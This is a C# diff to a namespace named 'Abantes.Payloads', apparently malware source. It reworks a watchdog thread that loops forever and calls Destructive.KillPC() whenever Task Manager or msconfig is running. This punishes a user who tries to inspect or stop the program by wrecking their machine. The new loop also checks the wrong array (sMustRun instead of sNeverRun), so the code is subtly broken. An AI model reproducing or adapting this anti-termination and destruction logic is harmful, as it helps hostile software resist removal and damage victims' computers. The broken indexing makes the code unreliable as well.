@@ -86,11 +86,11 @@ namespace Abantes.Payloads
         }
         public static void WathcDogThread()
         {
+            string[] NeverRun = { "msconfig", "taskmgr" };
+            string[] MustRun = { "Rules" };
             while (true)
             {
-                WatchDog.Rules("Rules");
-                WatchDog.msconfig("msconfig");
-                WatchDog.TaskMGR("taskmgr");
+                WatchDog.ProcessWatchDog(MustRun, NeverRun);
             }
         }
     }
@@ -250,24 +250,6 @@ namespace Abantes.Payloads
     }
     class WatchDog
     {
-        public static void ProcessRunningWatchDog(string[] sProcessNames)
-        {
-            //Put each process to watch for in an array to check if it exists
-
-            for (int i = 0; i < sProcessNames.Count(); i++)
-            {
-                Process[] proc = Process.GetProcessesByName(sProcessNames[i]);
-                if (proc.Length == 0)
-                {
-                    //Running
-                }
-                else
-                {
-                    //Not Running
-                    Destructive.KillPC();
-                }
-            }
-        }
         public static void FileWatchDog(string[] sFileName)
         {
             //Put each files path in an array to check if it exists
@@ -280,14 +262,14 @@ namespace Abantes.Payloads
                 }
             }
         }
-        public static void ProcessNotRunningWatchDog(string[] sProcessNames)
+        public static void ProcessWatchDog(string[] sMustRun, string[] sNeverRun)
         {
             //Put each process to watch for in an array to check if it exists
             
-            for (int i = 0; i < sProcessNames.Count(); i++)
+            for (int i = 0; i < sMustRun.Count(); i++)
             {
                 
-                Process[] proc = Process.GetProcessesByName(sProcessNames[i]);
+                Process[] proc = Process.GetProcessesByName(sMustRun[i]);
                 if (proc.Length > 0)
                 {
                     
@@ -308,6 +290,20 @@ namespace Abantes.Payloads
                     {
                         //Non-Flagged Process found
                     }
+                }
+            }
+
+            for (int i = 0; i < sNeverRun.Count(); i++)
+            {
+                Process[] proc = Process.GetProcessesByName(sMustRun[i]);
+                if (proc.Length == 0)
+                {
+                    //Running
+                }
+                else
+                {
+                    //Not Running
+                    Destructive.KillPC();
                 }
             }
         }
